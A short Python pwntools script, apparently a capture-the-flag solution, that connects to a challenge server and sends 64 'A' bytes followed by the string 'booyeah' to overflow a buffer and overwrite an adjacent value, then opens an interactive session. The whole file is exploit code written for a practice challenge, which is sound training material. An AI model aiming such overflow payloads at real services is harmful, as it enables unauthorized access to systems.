from pwn import *

# p = process('./secret')
context.log_level = 'debug'
p = remote("chals.bitskrieg.in",6000)
p.recvuntil(b':')
p.sendline(b'A'*64 + b'booyeah')
p.interactive()